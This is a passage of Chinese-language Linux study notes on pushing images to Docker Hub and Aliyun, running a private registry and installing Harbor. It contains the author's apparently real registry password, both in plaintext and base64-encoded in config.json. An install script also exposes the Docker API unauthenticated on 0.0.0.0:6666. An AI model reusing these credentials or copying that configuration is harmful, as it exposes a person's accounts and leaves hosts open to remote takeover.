https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded




#登录docker官方仓库方法1
[root@centos7 ~]# docker login
Login with your Docker ID to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com to create one.
Username: paranoid1997
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded




#登录成功后,自动生成验证信息,下次会自动登录,而无需手动登录
[root@centos7 ~]# cat .docker/config.json
{
	"auths": {
		"https://index.docker.io/v1/": {
			"auth": "cGFyYW5vaWQxOTk3OlhqeTE5OTcwNTIw"
		}
	},
	"HttpHeaders": {
		"User-Agent": "Docker-Client/19.03.13 (linux)"
	}
}
```

###### 48.9.1.1.2 给本地镜像打标签

上传本地镜像前必须先给上传的镜像用docker tag 命令打标签

标签格式: docker.io/用户帐号/镜像名:TAG

**范例:** 

```
[root@centos7 ~]# docker tag alpine:3.11 docker.io/paranoid1997/alpine:3.11
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              c059bfaa849c        8 months ago        5.59MB
alpine              3.11                a787cb986503        9 months ago        5.62MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB
centos              latest              5d0da3dc9764        11 months ago       231MB
centos              centos7.7.1908      08d05d1d5859        2 years ago         204MB
```

###### 48.9.1.1.3 上传本地镜像至官网

```
#如tag省略,将上传指定REPOSITORY的所有版本,如下示例
#[root@ubuntu1804 ~]#docker push docker.io/paranoid1997/alpine


[root@centos7 ~]# docker push docker.io/paranoid1997/alpine:3.11
The push refers to repository [docker.io/paranoid1997/alpine]
69715584ec78: Mounted from library/alpine 
3.11: digest: sha256:a0ce0e57c6900f6f13cee6f1c1e0337cedd745ebc1bac226c61eb574667c6d04 size: 528
```

###### 48.9.1.1.4 在官网验证上传的镜像

![1660275733601](linux体系.assets/1660275733601.png)

![1660275862689](linux体系.assets/1660275862689.png)

![1660275882775](linux体系.assets/1660275882775.png)

###### 48.9.1.1.5 下载上传的镜像并创建容器

```
[root@centos7 ~]# docker pull paranoid1997/alpine:3.11
3.11: Pulling from paranoid1997/alpine
Digest: sha256:a0ce0e57c6900f6f13cee6f1c1e0337cedd745ebc1bac226c61eb574667c6d04
Status: Image is up to date for paranoid1997/alpine:3.11
docker.io/paranoid1997/alpine:3.11


[root@centos7 ~]#docker images 
REPOSITORY             TAG                 IMAGE ID           CREATED         
    SIZE
wangxiaochun/alpine     3.11-v1             e7d92cdc71fe        12 days ago     
    5.59MB
[root@centos7 ~]#docker run -it --rm wangxiaochun/alpine:3.11-v1 sh
/ # cat /etc/issue
Welcome to Alpine Linux 3.11
Kernel \r on an \m (\l)
/ # du -sh /
5.6M /
/ # exit
```

###### 48.9.1.1.6 使用组织管理镜像

```
组织类似于名称空间，每个组织的名称全网站唯一，一个组织可以有多个用户帐户使用，并且可以指定不同用户对组织内的仓库不同的权限。

三种不同权限
1）Read-only: Pull and view repository details and builds
2）Read &Write: Pull, push, and view a repository; view, cancel, retry or trigger builds
3）Admin: Pull, push, view, edit, and delete a repository; edit build settings; update the repository description
```

#### 48.9.2 阿里云Docker仓库(熟悉)

![1660301419129](linux体系.assets/1660301419129.png)

##### 48.9.2.1 注册和登录阿里云仓库

**用浏览器访问http://cr.console.aliyun.com，输入注册的用户信息登录网站**

![1660301819818](linux体系.assets/1660301819818.png)

##### 48.9.2.2 设置仓库专用管理密码

```
账户名：刘森飚
密码：Xjy19970520
```

![1660302364557](linux体系.assets/1660302364557.png)

![1660302219582](linux体系.assets/1660302219582.png)

![1660302500243](linux体系.assets/1660302500243.png)



![1660302705566](linux体系.assets/1660302705566.png)

##### 48.9.2.3 创建仓库

**此步可不事先执行，docker push时可以自动创建私有仓库**

![1660303438051](linux体系.assets/1660303438051.png)

![1660303537980](linux体系.assets/1660303537980.png)

![1660303572589](linux体系.assets/1660303572589.png)

![1660303638501](linux体系.assets/1660303638501.png)



![1660304259767](linux体系.assets/1660304259767.png)

**查看仓库的路径用于上传镜像使用**

![1660304313462](linux体系.assets/1660304313462.png)

##### 48.9.2.4 上传镜像前先登录阿里云

```
[root@centos7 ~]# docker login --username=刘森飚 registry.cn-hangzhou.aliyuncs.com
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded




#登录密码保存在~/.docker/config.json文件中，下次将不会需要再输入密码登录
[root@centos7 ~]# cat .docker/config.json
{
	"auths": {
		"https://index.docker.io/v1/": {
			"auth": "cGFyYW5vaWQxOTk3OlhqeTE5OTcwNTIw"
		},
		"registry.cn-hangzhou.aliyuncs.com": {
			"auth": "5YiY5qOu6aOaOlhqeTE5OTcwNTIw"
		}
	},
	"HttpHeaders": {
		"User-Agent": "Docker-Client/19.03.13 (linux)"
	}
}
```

##### 48.9.2.5 给上传的镜像打标签

```
[root@centos7 ~]# docker images
REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
alpine                latest              c059bfaa849c        8 months ago        5.59MB
alpine                3.11                a787cb986503        9 months ago        5.62MB
paranoid1997/alpine   3.11                a787cb986503        9 months ago        5.62MB
hello-world           latest              feb5d9fea6a5        10 months ago       13.3kB
centos                latest              5d0da3dc9764        11 months ago       231MB
centos                centos7.7.1908      08d05d1d5859        2 years ago         204MB



#docker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine:[镜像版本号]
[root@centos7 ~]# docker tag alpine:3.11 registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine:3.11
#centos_liu默认没有，上传会变成私有镜像
[root@centos7 ~]# docker tag centos registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu



[root@centos7 ~]# docker images
'REPOSITORY                                                TAG                 IMAGE ID            CREATED             SIZE
alpine                                                    latest              c059bfaa849c        8 months ago        5.59MB
registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine       3.11                c059bfaa849c        8 months ago        5.59MB
alpine                                                    3.11                a787cb986503        9 months ago        5.62MB
paranoid1997/alpine                                       3.11                a787cb986503        9 months ago        5.62MB
hello-world                                               latest              feb5d9fea6a5        10 months ago       13.3kB
centos                                                    latest              5d0da3dc9764        11 months ago       231MB
registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu   latest              5d0da3dc9764        11 months ago       231MB
centos                                                    centos7.7.1908      08d05d1d5859        2 years ago         204MB
```

##### 48.9.2.6上传镜像至阿里云

```
#docker push registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine:[镜像版本号]

[root@centos7 ~]# docker push registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine:3.11
The push refers to repository [registry.cn-hangzhou.aliyuncs.com/liusenbiao/alpine]
8d3ac3489996: Pushed 
3.11: digest: sha256:e7d88de73db3d3fd9b2d63aa7f447a10fd0220b7cbf39803c803f2af9ba256b3 size: 528



[root@centos7 ~]# docker push registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu
The push refers to repository [registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu]
74ddd0ec08fa: Pushed 
latest: digest: sha256:a1801b843b1bfaf77c501e7a6d3f709401a1e0c83863037fa3aab063a7fdb9dc size: 529
```

##### 48.9.2.7 在网站查看上传的镜像

![1660305997623](linux体系.assets/1660305997623.png)

##### 48.9.2.8 从另一台主机上下载刚上传的镜像并运行容器

```
[root@node8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE



[root@node8 ~]# docker pull registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu
Using default tag: latest
latest: Pulling from liusenbiao/centos_liu
a1d0c7532777: Pull complete 
Digest: sha256:a1801b843b1bfaf77c501e7a6d3f709401a1e0c83863037fa3aab063a7fdb9dc
Status: Downloaded newer image for registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu:latest
registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu:latest



[root@node8 ~]# docker images
REPOSITORY                                                TAG                 IMAGE ID            CREATED             SIZE
registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu   latest              5d0da3dc9764        11 months ago       231MB



[root@node8 ~]# docker run -it --rm registry.cn-hangzhou.aliyuncs.com/liusenbiao/centos_liu sh
sh-4.4#  cat /etc/issue
\S
Kernel \r on an \m

sh-4.4# hostname -i
172.17.0.2
sh-4.4# exit
exit
```

#### 48.9.3 私有云单机仓库Docker Registry(了解)

##### 48.9.3.1 Docker Registry介绍

```
Docker Registry作为Docker的核心组件之一负责单主机的镜像内容的存储与分发，客户端的docker pull以及push命令都将直接与registry进行交互,最初版本的registry 由Python实现，由于设计初期在安全性，性能以及API的设计上有着诸多的缺陷，该版本在0.9之后停止了开发，由新项目distribution（新的docker register被称为Distribution）来重新设计并开发下一代registry，新的项目由go语言开发，所有的API，底层存储方式，系统架构都进行了全面的重新设计已解决上一代registry中存在的问题，2016年4月份registry 2.0正式发布，docker 1.6版本开始支持registry 2.0，而八月份随着docker 1.8 发布，docker hub正式启用2.1版本registry全面替代之前版本 registry，新版registry对镜像存储格式进行了重新设计并和旧版不兼容，docker 1.5和之前的版本无法读取2.0的镜像，另外，Registry 2.4版本之后支持了回收站机制，也就是可以删除镜像了，在2.4版本之前是无法支持删除镜像
的，所以如果你要使用最好是大于Registry 2.4版本的。


官方文档地址: https://docs.docker.com/registry/
官方github 地址: https://github.com/docker/distribution
官方部署文档: https://github.com/docker/docker.github.io/blob/master/registry/deploying.md
```

![1660307984552](linux体系.assets/1660307984552.png)

![1660308010005](linux体系.assets/1660308010005.png)

```
以下介绍通过官方提供的docker registry 镜像来简单搭建本地私有仓库环境

环境: 三台主机
10.0.0.100: 充当registry仓库服务器
10.0.0.101: 上传镜像
10.0.0.102: 下载镜像
```

##### 48.9.3.2 下载 docker registry镜像

```
[root@ubuntu1804 ~]#docker pull registry:2.7.1
[root@ubuntu1804 ~]#docker images
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
registry            2.7.1               708bc6af7e5e        6 days ago         
25.8MB
```

##### 48.9.3.3 搭建单机仓库

**创建授权用户密码使用目录**

```
[root@ubuntu1804 ~]#mkdir -p /etc/docker/auth
```

**创建授权的registry用户和密码**

```
#创建registry用户，用于上传和下载镜像
[root@ubuntu1804 ~]#apt -y install apache2 
[root@ubuntu1804 ~]#htpasswd -Bbn liu 123456 > /etc/docker/auth/registry
[root@ubuntu1804 ~]#cat /etc/docker/auth/registry
liu:$2y$05$nlRIIYEUBTSLdN2PkzodUue4ry7X/UyscpkkEufTDhEdI8nsyJMR6


#[root@ubuntu1804 ~]#docker run --entrypoint htpasswd registry:2.7.1 -Bbn liu 123456 > /etc/docker/auth/registry
```

**启动docker registry容器**

```
[root@ubuntu1804 ~]# docker run -d -p 5000:5000 --restart=always --name registry -v  /etc/docker/auth:/auth -e "REGISTRY_AUTH=htpasswd" -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/registry registry:2.7.1

998f970dd8ca6b98002f20ae27330fe607ca78f35bedcc8a6180688e48a907a7
```

**验证端口和容器**

```
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                   NAMES
998f970dd8ca       registry:2.7.1      "/entrypoint.sh /etc…"   About a minute 
ago   Up About a minute   0.0.0.0:5000->5000/tcp   registry



[root@ubuntu1804 ~]#ss -ntl
State   Recv-Q   Send-Q     Local Address:Port     Peer Address:Port           
LISTEN   0        64                0.0.0.0:2049          0.0.0.0:*             
LISTEN   0        128               0.0.0.0:48131         0.0.0.0:*             
LISTEN   0        128               0.0.0.0:33835         0.0.0.0:*             
LISTEN   0        128               0.0.0.0:58029         0.0.0.0:*             
LISTEN   0        128               0.0.0.0:111           0.0.0.0:*             
LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*             
LISTEN   0        128               0.0.0.0:22            0.0.0.0:*             
LISTEN   0        64                0.0.0.0:46429         0.0.0.0:*             
LISTEN   0        128             127.0.0.1:6014          0.0.0.0:*             
LISTEN   0        64                   [::]:2049             [::]:*             
LISTEN   0        128                     *:5000               *:*             
LISTEN   0        128                 [::]:39471           [::]:*             
LISTEN   0        128                 [::]:111             [::]:*             
LISTEN   0        64                   [::]:43601           [::]:*             
LISTEN   0        128                 [::]:56725           [::]:*             
LISTEN   0        128                 [::]:22               [::]:*             
LISTEN   0        128                 [::]:57881           [::]:*             
LISTEN   0        128                 [::1]:6014             [::]:*
```

##### 48.9.3.4 登录仓库

**直接登录报错**

```
#docker login 默认使用https登录,而docker registry为http,所以默认登录失败
[root@ubuntu1804 ~]#docker login 10.0.0.100:500
Username: liu
Password: 
Error response from daemon: Get https://10.0.0.100:500/v2/: dial tcp 
10.0.0.100:500: connect: connection refused
```

**将registry仓库服务器地址加入service 单元文件**

```
#修改配置让docker login支持http协议
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
[root@ubuntu1804 ~]#grep ExecStart /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 
--insecure-registry 10.0.0.100:5000
#或者修改下面文件
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json 
{
  "registry-mirrors": ["https://si7y70hh.mirror.aliyuncs.com"],
  "insecure-registry": ["10.0.0.100:5000"] 
}



[root@ubuntu1804 ~]#systemctl daemon-reload 
[root@ubuntu1804 ~]#systemctl restart docker
[root@ubuntu1804 ~]#ps aux|grep dockerd
root       2092  1.3  8.4 757088 83056 ?       Ssl  19:19   0:00 
/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --
insecure-registry 10.0.0.100:5000
root       2233  0.0  0.1  14428  1012 pts/0   S+   19:20   0:00 grep --
color=auto dockerd
```

**再次登录验证成功**

```
#在10.0.0.101主机上执行下面登录
[root@ubuntu1804 ~]#docker login 10.0.0.100:5000
Username: liu
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

##### 48.9.3.5 打标签并上传镜像

```
#在10.0.0.101主机上执行打标签上传
[root@ubuntu1804 ~]#docker tag centos7-base:v1 10.0.0.100:5000/centos7-base:v1
[root@ubuntu1804 ~]#docker push 10.0.0.100:5000/centos7-base:v1
The push refers to repository [10.0.0.100:5000/centos7-base]
2073413aebd6: Pushed 
6ec9af97c369: Pushed 
034f282942cd: Pushed 
v1: digest: 
sha256:02cd943f2569c7c55f08a979fd9661f1fd7893c424bca7b343188654ba63d98d size: 949
```

##### 48.9.3.6 下载镜像并启动容器

 **先修改docker的service文件**

```
#在10.0.0.102主机上下载镜像并启动容器
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
[root@ubuntu1804 ~]#grep ExecStart /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 
--insecure-registry 10.0.0.100:5000
[root@ubuntu1804 ~]#systemctl daemon-reload 
[root@ubuntu1804 ~]#systemctl restart docker
```

**登录registry仓库服务器**

```
[root@ubuntu1804 ~]#docker login 10.0.0.100:5000
Username: liu
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

**下载镜像并启动容器**

```
[root@ubuntu1804 ~]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
[root@ubuntu1804 ~]#docker pull 10.0.0.100:5000/centos7-base:v1
v1: Pulling from centos7-base
f34b00c7da20: Pull complete 
544476d462f7: Pull complete 
39345915aa1b: Pull complete 
Digest: sha256:02cd943f2569c7c55f08a979fd9661f1fd7893c424bca7b343188654ba63d98d
Status: Downloaded newer image for 10.0.0.100:5000/centos7-base:v1
10.0.0.100:5000/centos7-base:v1
[root@ubuntu1804 ~]#docker images 
REPOSITORY                     TAG                 IMAGE ID           CREATED   
          SIZE
10.0.0.100:5000/centos7-base   v1                 34ab3afcd3b3        2 days 
ago         403MB



[root@ubuntu1804 ~]#docker run -it --rm 34ab3afcd3b3 bash
[root@2bcb26b1b568 /]# cat /etc/redhat-release 
CentOS Linux release 7.7.1908 (Core)
[root@2bcb26b1b568 /]# exit
exit
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
```

#### 48.9.4 Docker之分布式仓库Harbor(重点)

##### 48.9.4.1 Harbor介绍和架构

###### 48.9.4.1.1 Harbor介绍

![1660309132650](linux体系.assets/1660309132650.png)

```
Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，由VMware开源，其通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源 Docker Distribution。作为一个企业级私有Registry服务器，Harbor 提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有 Registry 中，确保数据和知识产权在公司内部网络中管控，另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。



vmware 官方开源服务: https://vmware.github.io/
harbor 官方github 地址: https://github.com/vmware/harbor
harbor 官方网址: https://goharbor.io/
harbor 官方文档: https://goharbor.io/docs/
github文档: https://github.com/goharbor/harbor/tree/master/docs
```

###### 48.9.4.1.2 Harbor功能介绍

```
1）基于角色的访问控制: 用户与Docker镜像仓库通过“项目”进行组织管理，一个用户可以对多个镜像仓库在同一命名空间（project）里有不同的权限。
2）镜像复制: 镜像可在多个Registry实例中复制（同步）。尤其适合于负载均衡，高可用，混合云和多云的场景。
3）图形化用户界面: 用户可以通过浏览器来浏览，检索当前Docker镜像仓库，管理项目和命名空间。
4）AD/LDAP 支: Harbor可以集成企业内部已有的AD/LDAP，用于鉴权认证管理。
5）审计管理: 所有针对镜像仓库的操作都可以被记录追溯，用于审计管理。
6）国际化: 已拥有英文、中文、德文、日文和俄文的本地化版本。更多的语言将会添加进来。
7）RESTful API: 提供给管理员对于Harbor更多的操控, 使得与其它管理软件集成变得更容易。
8）部署简单: 提供在线和离线两种安装工具，也可以安装到vSphere平台(OVA方式)虚拟设备。
```

###### 48.9.4.1.3 Harbor组成

![1660309773817](linux体系.assets/1660309773817.png)

```
#harbor是由很多容器组成实现完整功能
[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS                    PORTS                                                              NAMES
b96c87530f7c        goharbor/nginx-photon:v1.7.6             "nginx -g 'daemon of…"   17 minutes ago      Up 17 minutes (healthy)   0.0.0.0:80->80/tcp, 0.0.0.0:443->443/tcp, 0.0.0.0:4443->4443/tcp   nginx
adde60a5c223        goharbor/harbor-portal:v1.7.6            "nginx -g 'daemon of…"   17 minutes ago      Up 17 minutes (healthy)   80/tcp                                                             harbor-portal
cbbc8ca474cb        goharbor/harbor-jobservice:v1.7.6        "/harbor/start.sh"       17 minutes ago      Up 17 minutes                                                                                harbor-jobservice
86a9d787c651        goharbor/harbor-core:v1.7.6              "/harbor/start.sh"       17 minutes ago      Up 17 minutes (healthy)                                                                      harbor-core
37dce93b25b4        goharbor/harbor-db:v1.7.6                "/entrypoint.sh post…"   17 minutes ago      Up 17 minutes (healthy)   5432/tcp                                                           harbor-db
34ad4b0891bc        goharbor/harbor-registryctl:v1.7.6       "/harbor/start.sh"       17 minutes ago      Up 17 minutes (healthy)                                                                      registryctl
244be4a60b2e        goharbor/registry-photon:v2.6.2-v1.7.6   "/entrypoint.sh /etc…"   17 minutes ago      Up 17 minutes (healthy)   5000/tcp                                                           registry
137c080ba8aa        goharbor/redis-photon:v1.7.6             "docker-entrypoint.s…"   17 minutes ago      Up 17 minutes             6379/tcp                                                           redis
7a450e770f2d        goharbor/harbor-adminserver:v1.7.6       "/harbor/start.sh"       17 minutes ago      Up 17 minutes (healthy)                                                                      harbor-adminserver
de66999c71d3        goharbor/harbor-log:v1.7.6               "/bin/sh -c /usr/loc…"   17 minutes ago      Up 17 minutes (healthy)   127.0.0.1:1514->10514/tcp                                          harbor-log
```

**Harbor各组件介绍**

```
Proxy: 对应启动组件nginx。它是一个nginx反向代理，代理Notary client（镜像认证）、Docker client（镜像上传下载等）和浏览器的访问请求（Core Service）给后端的各服务。

UI（Core Service）: 对应启动组件harbor-ui。底层数据存储使用mysql数据库，主要提供了四个子功能: 
1）UI: 一个web管理页面ui。
2）API: Harbor暴露的API服务。
3）Auth: 用户认证服务，decode后的token中的用户信息在这里进行认证；auth后端可以接db、ldap、uaa三种认证实现。
4）Token服务（上图中未体现）: 负责根据用户在每个project中的role来为每一个docker push/pull命令发布一个token，如果从docker client发送给registry的请求没有带token，registry会重定向请求到token服务创建token。

Registry: 对应启动组件registry。负责存储镜像文件，和处理镜像的pull/push命令。Harbor对镜像进行强制的访问控制，Registry会将客户端的每个pull、push请求转发到token服务来获取有效的token。

Admin Service: 对应启动组件harbor-adminserver。是系统的配置管理中心附带检查存储用量，ui和jobserver启动时候需要加载adminserver的配置。

Job Sevice: 对应启动组件harbor-jobservice。负责镜像复制工作的，他和registry通信，从一个registry pull镜像然后push到另一个registry，并记录job_log。

Log Collector: 对应启动组件harbor-log。日志汇总组件，通过docker的log-driver把日志汇总到一起。

DB: 对应启动组件harbor-db，负责存储project、 user、 role、replication、image_scan、access等的metadata数据。
```

##### 48.9.4.2 安装Harbor(重点)

###### 48.9.4.2.1 环境准备

```
下载地址: https://github.com/vmware/harbor/releases
安装文档: https://github.com/goharbor/harbor/blob/master/docs/install-config/_index.md


环境准备: 共四台主机
两台主机harbor服务器，地址: 10.0.0.101|102
两台主机harbor客户端上传和下载镜像
```

![1660310727013](linux体系.assets/1660310727013.png)

###### 48.9.4.2.2 安装docker

```
#直接跑一键安装docker脚本
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_docker_binary.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装二进制docker
#*********************************************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_FILE=docker-19.03.10.tgz

os(){
    OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        wget ${URL}${DOCKER_FILE} || { ${COLOR}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){ 
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装DOCKER..."${END}
    tar xf ${DOCKER_FILE} 
    mv docker/* /usr/bin/
    cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    mkdir -p /etc/docker
    tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    systemctl daemon-reload
    systemctl enable --now docker &> /dev/null
    systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR}"Docker 启动失败"${END};exit; }
    docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR}"Docker 安装失败"${END}
}

set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
        sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
}


set_centos_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
}


set_ubuntu_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}

main(){
    os
    check_file
    install
    set_alias
    set_swap_limit
}

main
```

###### 48.9.4.2.3 先安装docker compose

```
#docker compose 必须先于harbor安装，否则会报以下错误
[root@ubuntu1804 ~]#/apps/harbor/install.sh 

[Step 0]: checking installation environment ...

Note: docker version: 19.03.5
✖ Need to install docker-compose(1.7.1+) by yourself first and run this script 
again
```

**安装docker compose**

```
#方法1: 通过pip安装，版本较新docker_compose-1.25.3，推荐使用
[root@ubuntu1804 ~]#apt -y install python3-pip
[root@ubuntu1804 ~]#pip3 install docker-compose
[root@ubuntu1804 ~]#docker-compose --version
docker-compose version 1.25.3, build unknown



#方法2: 直接从github下载安装对应版本
#参看说明: https://github.com/docker/compose/releases/tag/1.25.3
#下载docker-compose-Linux-x86_64
[root@centos7 ~]# wget http://liusenbiao.cn/download/Docker/Docker_Compose/docker-compose-Linux-x86_64-1.25.3
[root@centos7 ~]# cp docker-compose-Linux-x86_64-1.25.3 /usr/bin/
[root@centos7 ~]# chmod +x /usr/bin/docker-compose-Linux-x86_64-1.25.3
[root@centos7 ~]# ln -s /usr/bin/docker-compose-Linux-x86_64-1.25.3 /usr/bin/docker-compose
[root@centos7 ~]# docker-compose --version
docker-compose version 1.25.3, build d4d1b42b



#方法3: 直接安装，版本较旧docker-compose-1.17.1-2，不推荐使用
[root@ubuntu1804 ~]#apt -y install docker-compose
[root@ubuntu1804 ~]#docker-compose --version
docker-compose version 1.17.1, build unknown
```

###### 48.9.4.2.4 下载Harbor安装包并解压缩

**以下使用 harbor 稳定版本1.7.6 安装包**

方法1: 下载离线完整安装包,推荐使用

```
#下载地址: https://github.com/vmware/harbor/releases
[root@ubuntu1804 ~]#wget https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-offline-installer-v1.7.6.tgz
```

方法2: 下载在线安装包 ,比较慢，不是很推荐

```
[root@ubuntu1804 ~]#wget https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-online-installer-v1.7.6.tgz
```

解压缩离线包

```
[root@ubuntu1804 ~]#mkdir /apps/
[root@ubuntu1804 ~]#tar xvf harbor-offline-installer-v1.7.6.tgz -C /apps/
```

###### 48.9.4.2.5 编辑配置文件harbor.cfg

```
#最新文档: https://github.com/goharbor/harbor/blob/master/docs/install-config/configure-yml-file.md
[root@centos7 ~]# vim /apps/harbor/harbor.cfg
hostname = 10.0.0.77            #修改此行,指向当前主机IP或FQDN
harbor_admin_password = 123456  #修改此行指定harbor登录用户admin的密码,默认用户/密码:admin/Harbor12345



#可选项
ui_url_protocol = http                #默认即可,如果修改为https,需要指定下面证书路径
ssl_cert = /data/cert/server.crt      #默认即可,https时，需指定下面证书文件路径
ss_cert_key = /data/cert/server.key   #默认即可,https时，需指定下面私钥文件路径
```

###### 48.9.4.2.6 运行harbor安装脚本

```
#先安装python
[root@centos7 ~]# yum -y install python2 openssl
#如果不安装openssl会出现如下错误
Traceback (most recent call last):
  File "./prepare", line 543, in <module>
    if customize_crt == 'on' and openssl_installed():
  File "./prepare", line 536, in openssl_installed
    shell_stat = subprocess.check_call(["which", "openssl"], stdout=FNULL, stderr=subprocess.STDOUT)
  File "/usr/lib64/python2.7/subprocess.py", line 542, in check_call
    raise CalledProcessError(retcode, cmd)
subprocess.CalledProcessError: Command '[u'which', u'openssl']' returned non-zero exit status 1




